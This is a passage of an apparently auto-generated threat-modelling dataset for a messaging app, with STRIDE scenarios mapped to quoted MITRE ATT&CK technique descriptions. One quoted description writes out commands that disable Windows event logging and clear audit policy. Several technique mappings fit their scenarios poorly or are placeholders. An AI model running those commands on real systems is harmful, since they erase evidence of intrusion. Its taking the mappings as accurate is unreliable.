            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains unauthorized access to the application's server infrastructure through compromised credentials, allowing broad access.",
            "Assumptions": [
                {
                    "Assumption": "Administrative credentials are weak or reused.",
                    "Role": "Application",
                    "Condition": "If security policies for credential management are not enforced."
                },
                {
                    "Assumption": "Attackers can intercept or steal these credentials.",
                    "Role": "Attacker",
                    "Condition": "If proper credential protection mechanisms are not in place."
                },
                {
                    "Assumption": "The server infrastructure does not sufficiently log and monitor access.",
                    "Role": "Application",
                    "Condition": "If server monitoring and logging are inadequate."
                }
            ],
            "Potential Impact": "Confidentiality, integrity, and availability are compromised as the attacker gains extensive access to sensitive data and controls.",
            "MITRE ATT&CK Keywords": [
                "server access",
                "credential theft",
                "unauthorized access",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious user exploits flaws in the device linking process to escalate privileges and gain unauthorized control over another user's account.",
            "Assumptions": [
                {
                    "Assumption": "The linking process has exploitable flaws.",
                    "Role": "Application",
                    "Condition": "If security measures in the linking mechanism are weak."
                },
                {
                    "Assumption": "Users are unaware of unauthorized linking attempts.",
                    "Role": "User",
                    "Condition": "If users are not notified of new device linkages."
                },
                {
                    "Assumption": "Attackers can identify and exploit the linking protocol weaknesses.",
                    "Role": "Attacker",
                    "Condition": "With sufficient knowledge of the protocol and its vulnerabilities."
                }
            ],
            "Potential Impact": "Confidentiality and integrity are compromised as the attacker gains control over another user's account.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "account control",
                "linking process",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sets up a fake Wi-Fi hotspot that mimics a genuine network, enticing users to connect, thereby intercepting their authentication keys.",
            "Assumptions": [
                {
                    "Assumption": "Users unknowingly connect to the fake Wi-Fi hotspot",
                    "Role": "User",
                    "Condition": "Presence of unsecured Wi-Fi hotspots"
                },
                {
                    "Assumption": "The attacker has set up the rogue Wi-Fi network to impersonate a legitimate one",
                    "Role": "Attacker",
                    "Condition": "Access to the targeted location or network proximity"
                },
                {
                    "Assumption": "The user's device is configured to automatically connect to known networks",
                    "Role": "User Device",
                    "Condition": "Default or lax network settings"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle",
                "Network",
                "Spoofing",
                "Credential Access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a phishing website that appears identical to the legitimate application\u2019s login page to steal user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users are directed to or land on the phishing site",
                    "Role": "User",
                    "Condition": "Phishing email/campaign or malvertising"
                },
                {
                    "Assumption": "The phishing site is not blacklisted by web browsers or security software",
                    "Role": "Attacker",
                    "Condition": "Newly registered or under-the-radar domains"
                },
                {
                    "Assumption": "Users do not verify the website's URL or SSL certificate",
                    "Role": "User",
                    "Condition": "Lack of security awareness or urgency"
                }
            ],
            "Potential Impact": "Unauthorized access to user accounts and unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Authentication",
                "Spoofing",
                "Credential Access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts communication and injects their own public key during the initial key exchange, enabling interception of future message exchanges.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is able to intercept the communication channel",
                    "Role": "Attacker",
                    "Condition": "Network-level access or compromise"
                },
                {
                    "Assumption": "Users do not verify the authenticity of the keys",
                    "Role": "User",
                    "Condition": "Absence or bypass of key verification procedures"
                },
                {
                    "Assumption": "The attacker has access to sophisticated tools to perform key injection",
                    "Role": "Attacker",
                    "Condition": "Advanced technical capability"
                }
            ],
            "Potential Impact": "Unauthorized interception of encrypted messages leading to potential unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "MitM",
                "Encryption",
                "Spoofing",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the device and modifies the SQLite database storing pre-keys and authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the device",
                    "Role": "Attacker",
                    "Condition": "Compromised device or malware infection"
                },
                {
                    "Assumption": "There are insufficient security measures protecting the database",
                    "Role": "Application Security",
                    "Condition": "Lack of encryption or weak access controls"
                },
                {
                    "Assumption": "Logging and monitoring do not detect unauthorized database modifications",
                    "Role": "System Administrator",
                    "Condition": "Lack of effective logging or alerting systems"
                }
            ],
            "Potential Impact": "Compromise of data integrity and potential unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "Database",
                "Tampering",
                "Device"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software installed on the device intercepts and alters outgoing encrypted messages before they are sent.",
            "Assumptions": [
                {
                    "Assumption": "Device is compromised by malware",
                    "Role": "Attacker",
                    "Condition": "Successful malware infection"
                },
                {
                    "Assumption": "Message content is accessible to the malware before encryption",
                    "Role": "Malware",
                    "Condition": "Access to application data"
                },
                {
                    "Assumption": "Users do not have sufficient anti-malware protections",
                    "Role": "User",
                    "Condition": "Lack of robust security software or awareness"
                }
            ],
            "Potential Impact": "Unauthorized alteration of messages compromising data integrity.",
            "MITRE ATT&CK Keywords": [
                "Malware",
                "Tampering",
                "Device",
                "Message Interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the desktop client's software update mechanism and delivers tampered updates to users.",
            "Assumptions": [
                {
                    "Assumption": "The update mechanism does not validate updates securely",
                    "Role": "Application Developer",
                    "Condition": "Lack of code signing or secure update checks"
                },
                {
                    "Assumption": "Attacker has access to the update distribution channel",
                    "Role": "Attacker",
                    "Condition": "Compromise of update server or distribution path"
                },
                {
                    "Assumption": "Users apply updates without verifying their source",
                    "Role": "User",
                    "Condition": "Automatic updates or user trust in the update process"
                }
            ],
            "Potential Impact": "Compromise of the application\u2019s integrity and potential unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "Supply Chain Compromise",
                "Software Update",
                "Tampering",
                "Desktop Client"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending specific messages during a dispute, claiming their account was compromised.",
            "Assumptions": [
                {
                    "Assumption": "Lack of non-repudiation mechanisms within the application",
                    "Role": "Application Security",
                    "Condition": "No message signing or logging"
                },
                {
                    "Assumption": "Account activity logs are not detailed or securely stored",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging practices"
                },
                {
                    "Assumption": "Compromised account is used to send disputed messages",
                    "Role": "Attacker/User",
                    "Condition": "Weak authentication or credential theft"
                }
            ],
            "Potential Impact": "Inability to verify the authenticity of message sender leading to disputes and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "Non-repudiation",
                "Account Misuse",
                "Repudiation",
                "Logging"
            ],
            "mitre_technique": {
                "name": "Rogue Domain Controller",
                "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                "id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
                "technique_id": "T1207"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A system administrator makes unauthorized changes to user account settings but denies involvement.",
            "Assumptions": [
                {
                    "Assumption": "System logs do not capture sufficient information to trace actions",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "Administrator credentials or session is compromised",
                    "Role": "Attacker",
                    "Condition": "Credential theft or phishing"
                },
                {
                    "Assumption": "No multifactor authentication for admin actions",
                    "Role": "Application Security",
                    "Condition": "Weak access control policies"
                }
            ],
            "Potential Impact": "Inability to verify or track administrative actions leading to misuse or policy breaches.",
            "MITRE ATT&CK Keywords": [
                "Access Management",
                "Logging",
                "Repudiation",
                "Admin Misuse"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies receiving important communication because delivery receipts are not implemented or logged.",
            "Assumptions": [
                {
                    "Assumption": "Application does not have delivery receipts or read receipts",
                    "Role": "Application Feature",
                    "Condition": "Feature omission"
                },
                {
                    "Assumption": "Logs do not track message deliveries effectively",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "Malicious actors interfering with message delivery",
                    "Role": "Attacker",
                    "Condition": "Network or device compromise"
                }
            ],
            "Potential Impact": "Disputes and potential loss of trust in the application's reliability.",
            "MITRE ATT&CK Keywords": [
                "Message Delivery",
                "Logging",
                "Repudiation",
                "Communication Disruption"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol, exposing message content during transit.",
            "Assumptions": [
                {
                    "Assumption": "Presence of a zero-day vulnerability in the encryption protocol",
                    "Role": "Developer",
                    "Condition": "Unpatched software or unknown vulnerability"
                },
                {
                    "Assumption": "Attacker has the capability to exploit this vulnerability",
                    "Role": "Attacker",
                    "Condition": "Advanced technical skill"
                },
                {
                    "Assumption": "No additional layers of protection for data in transit",
                    "Role": "Application Security",
                    "Condition": "Single-layer encryption without defense in depth"
                }
            ],
            "Potential Impact": "Exposing sensitive communication leading to unauthorized disclosure of information.",
            "MITRE ATT&CK Keywords": [
                "Encryption Protocols",
                "Vulnerability Exploitation",
                "Information Disclosure",
                "E2EE"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the SQLite database containing stored messages and user information.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the user's device",
                    "Role": "Attacker",
                    "Condition": "Compromised device or malware infection"
                },
                {
                    "Assumption": "The database is insufficiently protected or unencrypted",
                    "Role": "Application Security",
                    "Condition": "Lack of encryption or weak database security"
                },
                {
                    "Assumption": "No effective monitoring or alerting on unauthorized database access",
                    "Role": "System Administrator",
                    "Condition": "Lack of security monitoring"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data stored within the application.",
            "MITRE ATT&CK Keywords": [
                "Database Security",
                "Information Disclosure",
                "Device Compromise",
                "Data Breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A network-level attacker uses a packet sniffer to capture unencrypted metadata such as sender and receiver identities, message timestamps, and communication patterns.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the communication network",
                    "Role": "Attacker",
                    "Condition": "Network-level access or compromise"
                },
                {
                    "Assumption": "Metadata is not encrypted or obfuscated",
                    "Role": "Application Security",
                    "Condition": "Lack of full encryption for all data types"
                },
                {
                    "Assumption": "No effective network security measures in place",
                    "Role": "Network Administrator",
                    "Condition": "Lax network security controls"
                }
            ],
            "Potential Impact": "Exposure of communication patterns and potential profiling of users.",
            "MITRE ATT&CK Keywords": [
                "Packet Sniffing",
                "Network Security",
                "Metadata",
                "Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Network Security Appliances",
                "description": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413",
                "technique_id": "T1590.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a Distributed Denial of Service (DDoS) attack against the messaging server, disrupting communication for all users.",
            "Assumptions": [
                {
                    "Assumption": "The server does not have adequate protection against DDoS attacks",
                    "Role": "Network Administrator",
                    "Condition": "Lack of DDoS mitigation strategies"
                },
                {
                    "Assumption": "The messaging server is publicly accessible",
                    "Role": "Application Deployment",
                    "Condition": "Internet-facing servers"
                },
                {
                    "Assumption": "Attacker has access to a botnet",
                    "Role": "Attacker",
                    "Condition": "Compromised devices"
                }
            ],
            "Potential Impact": "Disruption of service access for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Server",
                "Denial of Service",
                "Availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
